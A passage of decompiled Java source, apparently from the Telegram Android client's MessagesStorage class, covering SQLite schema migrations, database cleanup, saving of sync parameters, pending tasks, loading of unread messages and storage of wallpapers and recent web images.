                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN exchange_id INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN key_date INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN fprint INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN fauthkey BLOB default NULL").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN khash BLOB default NULL").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 10").stepThis().dispose();
                        version = 10;
                    }
                    if (version == 10) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS web_recent_v3(id TEXT, type INTEGER, image_url TEXT, thumb_url TEXT, local_url TEXT, width INTEGER, height INTEGER, size INTEGER, date INTEGER, PRIMARY KEY (id, type));").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 11").stepThis().dispose();
                        version = 11;
                    }
                    if (version == 11 || version == 12) {
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS uid_mid_idx_media;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS mid_idx_media;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS uid_date_mid_idx_media;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS media;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS media_counts;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS media_v2(mid INTEGER PRIMARY KEY, uid INTEGER, date INTEGER, type INTEGER, data BLOB)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS media_counts_v2(uid INTEGER, type INTEGER, count INTEGER, PRIMARY KEY(uid, type))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_mid_type_date_idx_media ON media_v2(uid, mid, type, date);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS keyvalue(id TEXT PRIMARY KEY, value TEXT)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 13").stepThis().dispose();
                        version = 13;
                    }
                    if (version == 13) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE messages ADD COLUMN replydata BLOB default NULL").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 14").stepThis().dispose();
                        version = 14;
                    }
                    if (version == 14) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS hashtag_recent_v2(id TEXT PRIMARY KEY, date INTEGER);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 15").stepThis().dispose();
                        version = 15;
                    }
                    if (version == 15) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS webpage_pending(id INTEGER, mid INTEGER, PRIMARY KEY (id, mid));").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 16").stepThis().dispose();
                        version = 16;
                    }
                    if (version == 16) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN inbox_max INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN outbox_max INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 17").stepThis().dispose();
                        version = 17;
                    }
                    if (version == 17) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE bot_info(uid INTEGER PRIMARY KEY, info BLOB)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 18").stepThis().dispose();
                        version = 18;
                    }
                    if (version == 18) {
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS stickers;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS stickers_v2(id INTEGER PRIMARY KEY, data BLOB, date INTEGER, hash TEXT);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 19").stepThis().dispose();
                        version = 19;
                    }
                    if (version == 19) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS bot_keyboard(uid INTEGER PRIMARY KEY, mid INTEGER, info BLOB)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS bot_keyboard_idx_mid ON bot_keyboard(mid);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 20").stepThis().dispose();
                        version = 20;
                    }
                    if (version == 20) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE search_recent(did INTEGER PRIMARY KEY, date INTEGER);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 21").stepThis().dispose();
                        version = 21;
                    }
                    if (version == 21) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS chat_settings_v2(uid INTEGER PRIMARY KEY, info BLOB)").stepThis().dispose();
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT uid, participants FROM chat_settings WHERE uid < 0", new Object[0]);
                        state = MessagesStorage.this.database.executeFast("REPLACE INTO chat_settings_v2 VALUES(?, ?)");
                        while (cursor.next()) {
                            int chat_id = cursor.intValue(0);
                            data = cursor.byteBufferValue(1);
                            if (data != null) {
                                TLRPC$ChatParticipants participants = TLRPC$ChatParticipants.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                if (participants != null) {
                                    TLRPC$TL_chatFull chatFull = new TLRPC$TL_chatFull();
                                    chatFull.id = chat_id;
                                    chatFull.chat_photo = new TLRPC$TL_photoEmpty();
                                    chatFull.notify_settings = new TLRPC$TL_peerNotifySettingsEmpty();
                                    chatFull.exported_invite = new TLRPC$TL_chatInviteEmpty();
                                    chatFull.participants = participants;
                                    NativeByteBuffer data2 = new NativeByteBuffer(chatFull.getObjectSize());
                                    chatFull.serializeToStream(data2);
                                    state.requery();
                                    state.bindInteger(1, chat_id);
                                    state.bindByteBuffer(2, data2);
                                    state.step();
                                    data2.reuse();
                                }
                            }
                        }
                        state.dispose();
                        cursor.dispose();
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS chat_settings;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN last_mid_i INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN unread_count_i INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN pts INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN date_i INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS last_mid_i_idx_dialogs ON dialogs(last_mid_i);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS unread_count_i_idx_dialogs ON dialogs(unread_count_i);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE messages ADD COLUMN imp INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS messages_holes(uid INTEGER, start INTEGER, end INTEGER, PRIMARY KEY(uid, start));").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_end_messages_holes ON messages_holes(uid, end);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 22").stepThis().dispose();
                        version = 22;
                    }
                    if (version == 22) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS media_holes_v2(uid INTEGER, type INTEGER, start INTEGER, end INTEGER, PRIMARY KEY(uid, type, start));").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_end_media_holes_v2 ON media_holes_v2(uid, type, end);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 23").stepThis().dispose();
                        version = 23;
                    }
                    if (version == 23 || version == 24) {
                        MessagesStorage.this.database.executeFast("DELETE FROM media_holes_v2 WHERE uid != 0 AND type >= 0 AND start IN (0, 1)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 25").stepThis().dispose();
                        version = 25;
                    }
                    if (version == 25 || version == 26) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS channel_users_v2(did INTEGER, uid INTEGER, date INTEGER, data BLOB, PRIMARY KEY(did, uid))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 27").stepThis().dispose();
                        version = 27;
                    }
                    if (version == 27) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE web_recent_v3 ADD COLUMN document BLOB default NULL").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 28").stepThis().dispose();
                        version = 28;
                    }
                    if (version == 28 || version == 29) {
                        MessagesStorage.this.database.executeFast("DELETE FROM sent_files_v2 WHERE 1").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DELETE FROM download_queue WHERE 1").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 30").stepThis().dispose();
                        version = 30;
                    }
                    if (version == 30) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE chat_settings_v2 ADD COLUMN pinned INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS chat_settings_pinned_idx ON chat_settings_v2(uid, pinned) WHERE pinned != 0;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS chat_pinned(uid INTEGER PRIMARY KEY, pinned INTEGER, data BLOB)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS chat_pinned_mid_idx ON chat_pinned(uid, pinned) WHERE pinned != 0;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS users_data(uid INTEGER PRIMARY KEY, about TEXT)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 31").stepThis().dispose();
                        version = 31;
                    }
                    if (version == 31) {
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS bot_recent;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS chat_hints(did INTEGER, type INTEGER, rating REAL, date INTEGER, PRIMARY KEY(did, type))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS chat_hints_rating_idx ON chat_hints(rating);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 32").stepThis().dispose();
                        version = 32;
                    }
                    if (version == 32) {
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS uid_mid_idx_imp_messages;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP INDEX IF EXISTS uid_date_mid_imp_idx_messages;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 33").stepThis().dispose();
                        version = 33;
                    }
                    if (version == 33) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS pending_tasks(id INTEGER PRIMARY KEY, data BLOB);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 34").stepThis().dispose();
                        version = 34;
                    }
                    if (version == 34) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS stickers_featured(id INTEGER PRIMARY KEY, data BLOB, unread BLOB, date INTEGER, hash TEXT);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 35").stepThis().dispose();
                        version = 35;
                    }
                    if (version == 35) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS requested_holes(uid INTEGER, seq_out_start INTEGER, seq_out_end INTEGER, PRIMARY KEY (uid, seq_out_start, seq_out_end));").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 36").stepThis().dispose();
                        version = 36;
                    }
                    if (version == 36) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN in_seq_no INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 37").stepThis().dispose();
                        version = 37;
                    }
                    if (version == 37) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS botcache(id TEXT PRIMARY KEY, date INTEGER, data BLOB)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS botcache_date_idx ON botcache(date);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 38").stepThis().dispose();
                        version = 38;
                    }
                    if (version == 38) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE dialogs ADD COLUMN pinned INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 39").stepThis().dispose();
                        version = 39;
                    }
                    if (version == 39) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN admin_id INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 40").stepThis().dispose();
                        version = 40;
                    }
                    if (version == 40) {
                        MessagesStorage.this.fixNotificationSettings();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 41").stepThis().dispose();
                        version = 41;
                    }
                    if (version == 41) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE messages ADD COLUMN mention INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("ALTER TABLE user_contacts_v6 ADD COLUMN imported INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS uid_mention_idx_messages ON messages(uid, mention, read_state);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 42").stepThis().dispose();
                        version = 42;
                    }
                    if (version == 42) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS sharing_locations(uid INTEGER PRIMARY KEY, mid INTEGER, date INTEGER, period INTEGER, message BLOB);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 43").stepThis().dispose();
                        version = 43;
                    }
                    if (version == 43) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS channel_admins(did INTEGER, uid INTEGER, PRIMARY KEY(did, uid))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 44").stepThis().dispose();
                        version = 44;
                    }
                    if (version == 44) {
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS user_contacts_v7(key TEXT PRIMARY KEY, uid INTEGER, fname TEXT, sname TEXT, imported INTEGER)").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE TABLE IF NOT EXISTS user_phones_v7(key TEXT, phone TEXT, sphone TEXT, deleted INTEGER, PRIMARY KEY (key, phone))").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("CREATE INDEX IF NOT EXISTS sphone_deleted_idx_user_phones ON user_phones_v7(sphone, deleted);").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 45").stepThis().dispose();
                        version = 45;
                    }
                    if (version == 45) {
                        MessagesStorage.this.database.executeFast("ALTER TABLE enc_chats ADD COLUMN mtproto_seq INTEGER default 0").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("PRAGMA user_version = 46").stepThis().dispose();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private void cleanupInternal() {
        lastDateValue = 0;
        lastSeqValue = 0;
        lastPtsValue = 0;
        lastQtsValue = 0;
        lastSecretVersion = 0;
        this.lastSavedSeq = 0;
        this.lastSavedPts = 0;
        this.lastSavedDate = 0;
        this.lastSavedQts = 0;
        secretPBytes = null;
        secretG = 0;
        if (this.database != null) {
            this.database.close();
            this.database = null;
        }
        if (this.cacheFile != null) {
            this.cacheFile.delete();
            this.cacheFile = null;
        }
    }

    public void cleanup(final boolean isLogin) {
        this.storageQueue.cleanupQueue();
        this.storageQueue.postRunnable(new Runnable() {

            /* renamed from: org.telegram.messenger.MessagesStorage$2$1 */
            class C15301 implements Runnable {
                C15301() {
                }

                public void run() {
                    MessagesController.getInstance().getDifference();
                }
            }

            public void run() {
                MessagesStorage.this.cleanupInternal();
                MessagesStorage.this.openDatabase(false);
                if (isLogin) {
                    Utilities.stageQueue.postRunnable(new C15301());
                }
            }
        });
    }

    public void saveSecretParams(final int lsv, final int sg, final byte[] pbytes) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                int i = 1;
                try {
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("UPDATE params SET lsv = ?, sg = ?, pbytes = ? WHERE id = 1");
                    state.bindInteger(1, lsv);
                    state.bindInteger(2, sg);
                    if (pbytes != null) {
                        i = pbytes.length;
                    }
                    NativeByteBuffer data = new NativeByteBuffer(i);
                    if (pbytes != null) {
                        data.writeBytes(pbytes);
                    }
                    state.bindByteBuffer(3, data);
                    state.step();
                    state.dispose();
                    data.reuse();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private void fixNotificationSettings() {
        this.storageQueue.postRunnable(new C15444());
    }

    public long createPendingTask(final NativeByteBuffer data) {
        if (data == null) {
            return 0;
        }
        final long id = this.lastTaskId.getAndAdd(1);
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO pending_tasks VALUES(?, ?)");
                    state.bindLong(1, id);
                    state.bindByteBuffer(2, data);
                    state.step();
                    state.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                } finally {
                    data.reuse();
                }
            }
        });
        return id;
    }

    public void removePendingTask(final long id) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM pending_tasks WHERE id = " + id).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private void loadPendingTasks() {
        this.storageQueue.postRunnable(new C15587());
    }

    public void saveChannelPts(final int channelId, final int pts) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("UPDATE dialogs SET pts = ? WHERE did = ?");
                    state.bindInteger(1, pts);
                    state.bindInteger(2, -channelId);
                    state.step();
                    state.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private void saveDiffParamsInternal(int seq, int pts, int date, int qts) {
        try {
            if (this.lastSavedSeq != seq || this.lastSavedPts != pts || this.lastSavedDate != date || lastQtsValue != qts) {
                SQLitePreparedStatement state = this.database.executeFast("UPDATE params SET seq = ?, pts = ?, date = ?, qts = ? WHERE id = 1");
                state.bindInteger(1, seq);
                state.bindInteger(2, pts);
                state.bindInteger(3, date);
                state.bindInteger(4, qts);
                state.step();
                state.dispose();
                this.lastSavedSeq = seq;
                this.lastSavedPts = pts;
                this.lastSavedDate = date;
                this.lastSavedQts = qts;
            }
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    public void saveDiffParams(int seq, int pts, int date, int qts) {
        final int i = seq;
        final int i2 = pts;
        final int i3 = date;
        final int i4 = qts;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                MessagesStorage.this.saveDiffParamsInternal(i, i2, i3, i4);
            }
        });
    }

    public void setDialogFlags(long did, long flags) {
        final long j = did;
        final long j2 = flags;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "REPLACE INTO dialog_settings VALUES(%d, %d)", new Object[]{Long.valueOf(j), Long.valueOf(j2)})).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void loadUnreadMessages() {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    long did;
                    int lower_id;
                    ArrayList<Integer> usersToLoad = new ArrayList();
                    ArrayList<Integer> chatsToLoad = new ArrayList();
                    ArrayList<Integer> encryptedChatIds = new ArrayList();
                    final HashMap<Long, Integer> pushDialogs = new HashMap();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT d.did, d.unread_count, s.flags FROM dialogs as d LEFT JOIN dialog_settings as s ON d.did = s.did WHERE d.unread_count != 0", new Object[0]);
                    StringBuilder ids = new StringBuilder();
                    int currentTime = ConnectionsManager.getInstance().getCurrentTime();
                    while (cursor.next()) {
                        long flags = cursor.longValue(2);
                        boolean muted = (1 & flags) != 0;
                        int mutedUntil = (int) (flags >> 32);
                        if (cursor.isNull(2) || !muted || (mutedUntil != 0 && mutedUntil < currentTime)) {
                            did = cursor.longValue(0);
                            pushDialogs.put(Long.valueOf(did), Integer.valueOf(cursor.intValue(1)));
                            if (ids.length() != 0) {
                                ids.append(",");
                            }
                            ids.append(did);
                            lower_id = (int) did;
                            int high_id = (int) (did >> 32);
                            if (lower_id == 0) {
                                if (!encryptedChatIds.contains(Integer.valueOf(high_id))) {
                                    encryptedChatIds.add(Integer.valueOf(high_id));
                                }
                            } else if (lower_id >= 0) {
                                if (!usersToLoad.contains(Integer.valueOf(lower_id))) {
                                    usersToLoad.add(Integer.valueOf(lower_id));
                                }
                            } else if (!chatsToLoad.contains(Integer.valueOf(-lower_id))) {
                                chatsToLoad.add(Integer.valueOf(-lower_id));
                            }
                        }
                    }
                    cursor.dispose();
                    ArrayList<Long> replyMessages = new ArrayList();
                    HashMap<Integer, ArrayList<TLRPC$Message>> replyMessageOwners = new HashMap();
                    final ArrayList<TLRPC$Message> messages = new ArrayList();
                    final ArrayList<User> users = new ArrayList();
                    final ArrayList<TLRPC$Chat> chats = new ArrayList();
                    final ArrayList<TLRPC$EncryptedChat> encryptedChats = new ArrayList();
                    if (ids.length() > 0) {
                        AbstractSerializedData data;
                        TLRPC$Message message;
                        TLRPC$Message tLRPC$Message;
                        ArrayList<TLRPC$Message> arrayList;
                        int a;
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT read_state, data, send_state, mid, date, uid, replydata FROM messages WHERE uid IN (" + ids.toString() + ") AND out = 0 AND read_state IN(0,2) ORDER BY date DESC LIMIT 50", new Object[0]);
                        while (cursor.next()) {
                            data = cursor.byteBufferValue(1);
                            if (data != null) {
                                message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                MessageObject.setUnreadFlags(message, cursor.intValue(0));
                                message.id = cursor.intValue(3);
                                message.date = cursor.intValue(4);
                                message.dialog_id = cursor.longValue(5);
                                messages.add(message);
                                lower_id = (int) message.dialog_id;
                                MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                                message.send_state = cursor.intValue(2);
                                if (!(message.to_id.channel_id != 0 || MessageObject.isUnread(message) || lower_id == 0) || message.id > 0) {
                                    message.send_state = 0;
                                }
                                if (lower_id == 0 && !cursor.isNull(5)) {
                                    message.random_id = cursor.longValue(5);
                                }
                                try {
                                    if (message.reply_to_msg_id != 0 && ((message.action instanceof TLRPC$TL_messageActionPinMessage) || (message.action instanceof TLRPC$TL_messageActionPaymentSent) || (message.action instanceof TLRPC$TL_messageActionGameScore))) {
                                        if (!cursor.isNull(6)) {
                                            data = cursor.byteBufferValue(6);
                                            if (data != null) {
                                                message.replyMessage = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                                data.reuse();
                                                if (message.replyMessage != null) {
                                                    if (MessageObject.isMegagroup(message)) {
                                                        tLRPC$Message = message.replyMessage;
                                                        tLRPC$Message.flags |= Integer.MIN_VALUE;
                                                    }
                                                    MessagesStorage.addUsersAndChatsFromMessage(message.replyMessage, usersToLoad, chatsToLoad);
                                                }
                                            }
                                        }
                                        if (message.replyMessage == null) {
                                            long messageId = (long) message.reply_to_msg_id;
                                            if (message.to_id.channel_id != 0) {
                                                messageId |= ((long) message.to_id.channel_id) << 32;
                                            }
                                            if (!replyMessages.contains(Long.valueOf(messageId))) {
                                                replyMessages.add(Long.valueOf(messageId));
                                            }
                                            arrayList = (ArrayList) replyMessageOwners.get(Integer.valueOf(message.reply_to_msg_id));
                                            if (arrayList == null) {
                                                arrayList = new ArrayList();
                                                replyMessageOwners.put(Integer.valueOf(message.reply_to_msg_id), arrayList);
                                            }
                                            arrayList.add(message);
                                        }
                                    }
                                } catch (Exception e) {
                                    FileLog.e(e);
                                }
                            }
                        }
                        cursor.dispose();
                        if (!replyMessages.isEmpty()) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data, mid, date, uid FROM messages WHERE mid IN(%s)", new Object[]{TextUtils.join(",", replyMessages)}), new Object[0]);
                            while (cursor.next()) {
                                data = cursor.byteBufferValue(0);
                                if (data != null) {
                                    message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                    data.reuse();
                                    message.id = cursor.intValue(1);
                                    message.date = cursor.intValue(2);
                                    message.dialog_id = cursor.longValue(3);
                                    MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                                    arrayList = (ArrayList) replyMessageOwners.get(Integer.valueOf(message.id));
                                    if (arrayList != null) {
                                        for (a = 0; a < arrayList.size(); a++) {
                                            TLRPC$Message m = (TLRPC$Message) arrayList.get(a);
                                            m.replyMessage = message;
                                            if (MessageObject.isMegagroup(m)) {
                                                tLRPC$Message = m.replyMessage;
                                                tLRPC$Message.flags |= Integer.MIN_VALUE;
                                            }
                                        }
                                    }
                                }
                            }
                            cursor.dispose();
                        }
                        if (!encryptedChatIds.isEmpty()) {
                            MessagesStorage.this.getEncryptedChatsInternal(TextUtils.join(",", encryptedChatIds), encryptedChats, usersToLoad);
                        }
                        if (!usersToLoad.isEmpty()) {
                            MessagesStorage.this.getUsersInternal(TextUtils.join(",", usersToLoad), users);
                        }
                        if (!chatsToLoad.isEmpty()) {
                            MessagesStorage.this.getChatsInternal(TextUtils.join(",", chatsToLoad), chats);
                            a = 0;
                            while (a < chats.size()) {
                                TLRPC$Chat chat = (TLRPC$Chat) chats.get(a);
                                if (chat != null && (chat.left || chat.migrated_to != null)) {
                                    MessagesStorage.this.database.executeFast("UPDATE dialogs SET unread_count = 0 WHERE did = " + ((long) (-chat.id))).stepThis().dispose();
                                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET read_state = 3 WHERE uid = %d AND mid > 0 AND read_state IN(0,2) AND out = 0", new Object[]{Long.valueOf(did)})).stepThis().dispose();
                                    chats.remove(a);
                                    a--;
                                    pushDialogs.remove(Long.valueOf((long) (-chat.id)));
                                    int b = 0;
                                    while (b < messages.size()) {
                                        if (((TLRPC$Message) messages.get(b)).dialog_id == ((long) (-chat.id))) {
                                            messages.remove(b);
                                            b--;
                                        }
                                        b++;
                                    }
                                }
                                a++;
                            }
                        }
                    }
                    Collections.reverse(messages);
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            NotificationsController.getInstance().processLoadedUnreadMessages(pushDialogs, messages, users, chats, encryptedChats);
                        }
                    });
                } catch (Exception e2) {
                    FileLog.e(e2);
                }
            }
        });
    }

    public void putWallpapers(final ArrayList<TLRPC$WallPaper> wallPapers) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                int num = 0;
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM wallpapers WHERE 1").stepThis().dispose();
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO wallpapers VALUES(?, ?)");
                    Iterator it = wallPapers.iterator();
                    while (it.hasNext()) {
                        TLRPC$WallPaper wallPaper = (TLRPC$WallPaper) it.next();
                        state.requery();
                        NativeByteBuffer data = new NativeByteBuffer(wallPaper.getObjectSize());
                        wallPaper.serializeToStream(data);
                        state.bindInteger(1, num);
                        state.bindByteBuffer(2, data);
                        state.step();
                        num++;
                        data.reuse();
                    }
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void loadWebRecent(final int type) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT id, image_url, thumb_url, local_url, width, height, size, date, document FROM web_recent_v3 WHERE type = " + type + " ORDER BY date DESC", new Object[0]);
                    final ArrayList<MediaController$SearchImage> arrayList = new ArrayList();
                    while (cursor.next()) {
                        MediaController$SearchImage searchImage = new MediaController$SearchImage();
                        searchImage.id = cursor.stringValue(0);
                        searchImage.imageUrl = cursor.stringValue(1);
                        searchImage.thumbUrl = cursor.stringValue(2);
                        searchImage.localUrl = cursor.stringValue(3);
                        searchImage.width = cursor.intValue(4);
                        searchImage.height = cursor.intValue(5);
                        searchImage.size = cursor.intValue(6);
                        searchImage.date = cursor.intValue(7);
                        if (!cursor.isNull(8)) {
                            NativeByteBuffer data = cursor.byteBufferValue(8);
                            if (data != null) {
                                searchImage.document = TLRPC$Document.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                            }
                        }
                        searchImage.type = type;
                        arrayList.add(searchImage);
                    }
                    cursor.dispose();
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            NotificationCenter.getInstance().postNotificationName(NotificationCenter.recentImagesDidLoaded, new Object[]{Integer.valueOf(type), arrayList});
                        }
                    });
                } catch (Throwable e) {
                    FileLog.e(e);
                }
            }
